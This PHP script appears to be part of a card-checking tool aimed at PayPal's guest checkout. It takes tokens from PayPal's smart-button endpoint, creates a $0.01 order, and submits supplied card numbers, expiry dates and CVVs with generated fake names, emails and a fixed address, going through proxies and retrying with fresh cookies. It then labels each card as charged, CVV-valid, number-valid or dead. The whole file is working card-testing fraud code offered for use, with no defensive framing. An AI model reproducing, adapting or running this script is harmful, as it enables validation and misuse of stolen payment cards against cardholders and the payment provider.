<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&sdkVersion=5.0.335&components.0=buttons&locale.country=US&locale.lang=en&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFaRW9UTElzQnI4Y3dxbE5wVXViS2hYUm02cUZ4V09VaS1mekpzYi1rV2FpM0tWNF9ld1I4SGtTR3lLRWpHN2gyeW8xa3l4dUlqdDNLTzImY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF9tdmh4dGh4aHhlYW13bHJzYXVna2dqeGRmcmpqenMifX0&clientID=AQZEoTLIsBr8cwqlNpUubKhXRm6qFxWOUi-fzJsb-kWai3KV4_ewR8HkSGyKEjG7h2yo1kyxuIjt3KO2&sdkCorrelationID=f171383fa714f&storageID=uid_3a6aef7ea6_mdu6ntu6mjm&sessionID=uid_e60b6d84ba_mdu6ntu6mjm&buttonSessionID=uid_cc95077239_mdy6mda6mdc&env=production&buttonSize=large&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjp0cnVlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6ZmFsc2V9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwiemltcGxlciI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ3ZWNoYXRwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGF5dSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJibGlrIjp7ImVsaWdpYmxlIjpmYWxzZX0sInRydXN0bHkiOnsiZWxpZ2libGUiOmZhbHNlfSwib3h4byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtYXhpbWEiOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=mobile&experiment.enableVenmo=false&experiment.enableVenmoAppLabel=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&renderedButtons.0=paypal&renderedButtons.1=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=true&experience=&allowBillingPayments=true', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$bearer = $this->getstr($r1->body, 'facilitatorAccessToken":"', '"');

if (empty($bearer)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = '{"purchase_units":[{"amount":{"value":"0.01","currency_code":"USD"},"description":"Love"}],"intent":"CAPTURE","application_context":{}}';

$headers = [
	"content-type: application/json",
	"Authorization: Bearer $bearer"
];

$r2 = $this->curlx->Post('https://www.paypal.com/v2/checkout/orders', $data, $headers, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$id = $this->getstr($r2->body, '"id":"', '"');

if (empty($id)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$data = '{"query":"\n mutation payWithCard(\n $token: String!\n $card: CardInput!\n $phoneNumber: String\n $firstName: String\n $lastName: String\n $shippingAddress: AddressInput\n $billingAddress: AddressInput\n $email: String\n $currencyConversionType: CheckoutCurrencyConversionType\n $installmentTerm: Int\n ) {\n approveGuestPaymentWithCreditCard(\n token: $token\n card: $card\n phoneNumber: $phoneNumber\n firstName: $firstName\n lastName: $lastName\n email: $email\n shippingAddress: $shippingAddress\n billingAddress: $billingAddress\n currencyConversionType: $currencyConversionType\n installmentTerm: $installmentTerm\n ) {\n flags {\n is3DSecureRequired\n }\n cart {\n intent\n cartId\n buyer {\n userId\n auth {\n accessToken\n }\n }\n returnUrl {\n href\n }\n }\n paymentContingencies {\n threeDomainSecure {\n status\n method\n redirectUrl {\n href\n }\n parameter\n }\n }\n }\n }\n ","variables":{"token":"'.$id.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mm.'/'.$yyyy.'","postalCode":"11215","securityCode":"'.$cvv.'"},"phoneNumber":"2453759468","firstName":"'.$fake->first.'","lastName":"'.$fake->last.'","billingAddress":{"givenName":"'.$fake->first.'","familyName":"'.$fake->last.'","line1":"388 7th Street","line2":null,"city":"Brooklyn","state":"NY","postalCode":"11215","country":"US"},"shippingAddress":{"givenName":"'.$fake->first.'","familyName":"'.$fake->last.'","line1":"388 7th Street","line2":null,"city":"Brooklyn","state":"NY","postalCode":"11215","country":"US"},"email":"'.$fake->email.'","currencyConversionType":"VENDOR"},"operationName":null}';

$headers = [
	"content-type: application/json",
	'paypal-client-context: '.$id.'',
	'paypal-client-metadata-id: '.$id.'',
	'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_ff9b886d36_mtg6mjm6ndc&buttonSessionID=uid_7a630d85fd_mtg6mju6mzk&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVFaRW9UTElzQnI4Y3dxbE5wVXViS2hYUm02cUZ4V09VaS1mekpzYi1rV2FpM0tWNF9ld1I4SGtTR3lLRWpHN2gyeW8xa3l4dUlqdDNLTzImY3VycmVuY3k9VVNEIiwiYXR0cnMiOnsiZGF0YS1zZGstaW50ZWdyYXRpb24tc291cmNlIjoiYnV0dG9uLWZhY3RvcnkiLCJkYXRhLXVpZCI6InVpZF9tdmh4dGh4aHhlYW13bHJzYXVna2dqeGRmcmpqenMifX0&disable-card=&token='.$id.'',
	"x-app-name: standardcardfields",
	"x-country: US"
];

$r3 = $this->curlx->Post('https://www.paypal.com/graphql?fetch_credit_form_submit', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$code = empty($tmp = $this->getstr($r3->body, 'state":"', '"')) ? $this->getstr($r3->body, 'code":"', '"') : $tmp;

$code = empty($code) ? $this->getstr($r3->body, 'message":"', '"') : $code;

$err_msg = str_replace('_', ' ', $code);

if (strpos($r3->body, 'parentType":"Auth') !== false || strpos($r3->body, '"NON_PAYABLE"') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - Payment Successfully!'];
} elseif (strpos($r3->body, 'INVALID_BILLING_ADDRESS') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - $err_msg!"];
} elseif (strpos($r3->body, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CVV CARD - $err_msg!"];
} elseif (strpos($r3->body, 'INVALID_SECURITY_CODE') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CCN CARD - $err_msg!"];
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - ".(empty($code) ? 'Unknown Error' : $err_msg)."!"];
}

end: